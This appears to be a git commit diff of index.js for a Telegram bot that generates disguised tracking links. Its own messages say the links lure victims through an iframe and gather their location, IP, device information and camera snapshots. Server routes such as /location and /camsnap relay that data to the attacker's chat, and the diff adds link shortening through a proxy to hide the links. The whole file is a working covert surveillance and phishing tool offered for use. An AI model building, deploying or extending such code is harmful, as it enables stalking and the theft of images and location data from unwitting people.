c49ba3d3e0d2ddd8f3908ad971405127e8866497
manuwaffcall017 <138152940+manuwaffcall017@users.noreply.github.com>
2023-07-01 11:25:14 -0700

    Update index.js

--- index.js
+++ index.js
@@ -1,21 +1,20 @@
 const fs = require("fs");
 const express = require("express");
 var cors = require('cors');
-var badyParser = require('body-parser');
+var bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
-const bot = new TelegramBot(process.env["bot"], {polling:true}); 
-var jsonParser=bodyParser.json({limit:1024*20, type:'application/json'});
-var urlencodedParser=bodyParser.urlencoded({extended:true,limit:1024*20, type:'application/x-www-form-urlencoded' });
+const bot = new TelegramBot(process.env["bot"], {polling: true});
+var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
+var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
 const app = express();
 app.use(jsonParser);
 app.use(urlencodedParser);
 app.use(cors());
 app.set("view engine", "ejs");
 
-
 //Modify your URL here
-var hostURL="https://cbot.onlinoin.repl.co";
+var hostURL="https://mybot.onlinoin.repl.co";
 //TOGGLE for 1pt Proxy and Shorters
 var use1pt=true;
 
@@ -26,16 +25,16 @@ var ip;
 var d = new Date();
 d=d.toJSON().slice(0,19).replace('T',':');
 if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-  
+
 if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/onlinehacking");
+res.redirect("https://t.me/OnlineHacking");
 }
 
-         
-                              
+
+
 });
 
 app.get("/c/:path/:uri",(req,res)=>{
@@ -49,36 +48,36 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/onlinehacking");
-}                          
-});
+res.redirect("https://t.me/OnlineHacking");
+}
 
+
+
+});
 
 
 
 bot.on('message', async (msg) => {
 const chatId = msg.chat.id;
 
- 
+
 
 if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
  createLink(chatId,msg.text); 
 }
-  
+
 if(msg.text=="/start"){
-  setTimeout(function(){
 var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
- 
-}, 6000)
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to Camera Hacking Bot people just through a simple link.\n\nIt can gather informations like location , device info, camera snaps.\n\nJoin @OnlineHacking for more tool.\n\nType /help for more info.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,`  Through this bot you can track people just by sending a simple link.\n\nSend /create
+bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
 to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
 the url it will send you 2 links which you can use to track people.
 \n\nSpecifications.
@@ -88,9 +87,20 @@ the url it will send you 2 links which you can use to track people.
 \n\nJoin Telegram Channel: https://t.me/OnlineHacKing
 `);
 }
-  
-  
+
+
 });
+
+bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
+bot.answerCallbackQuery(callbackQuery.id);
+if(callbackQuery.data=="crenew"){
+createNew(callbackQuery.message.chat.id);
+} 
+});
+bot.on('polling_error', (error) => {
+//console.log(error.code); 
+});
+
 
 
 
@@ -101,7 +111,7 @@ async function createLink(cid,msg){
 var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
 
 if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
- 
+
 var url=cid.toString(36)+'/'+btoa(msg);
 var m={
   reply_markup:JSON.stringify({
@@ -111,11 +121,11 @@ var m={
 
 var cUrl=`${hostURL}/c/${url}`;
 var wUrl=`${hostURL}/w/${url}`;
-  
+
 bot.sendChatAction(cid,"typing");
 if(use1pt){
-var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
-var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
+var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.1pt.co/proxy?url="+cUrl)}`).then(res => res.json());
+var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.1pt.co/proxy?url="+wUrl)}`).then(res => res.json());
 
 var f="",g="";
 
@@ -126,7 +136,7 @@ f+=x[c]+"\n";
 for(var c in y){
 g+=y[c]+"\n";
 }
-  
+
 bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\n\nURL: ${msg}\n\n💢 Join Telegram Channel @OnlineHacking\n\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
 }
 else{
@@ -158,13 +168,13 @@ var ip;
 if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
 res.json({"ip":ip});
 
-  
+
 });
 
 
 app.post("/location",(req,res)=>{
 
-  
+
 var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
 var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
 var uid=decodeURIComponent(req.body.uid) || null;
@@ -174,7 +184,7 @@ if(lon != null && lat != null && uid != null && acc != null){
 bot.sendLocation(parseInt(uid,36),lat,lon);
 
 bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
-  
+
 res.send("Done");
 }
 });
@@ -191,7 +201,7 @@ data=data.replaceAll("<br>","\n");
 
 bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});
 
-  
+
 res.send("Done");
 }
 });
@@ -200,11 +210,11 @@ res.send("Done");
 app.post("/camsnap",(req,res)=>{
 var uid=decodeURIComponent(req.body.uid)  || null;
 var img=decodeURIComponent(req.body.img) || null;
-  
+
 if( uid != null && img != null){
-  
+
 var buffer=Buffer.from(img,'base64');
-  
+
 var info={
 filename:"camsnap.png",
 contentType: 'image/png'
@@ -219,7 +229,7 @@ console.log(error);
 
 
 res.send("Done");
- 
+
 }
 
 });
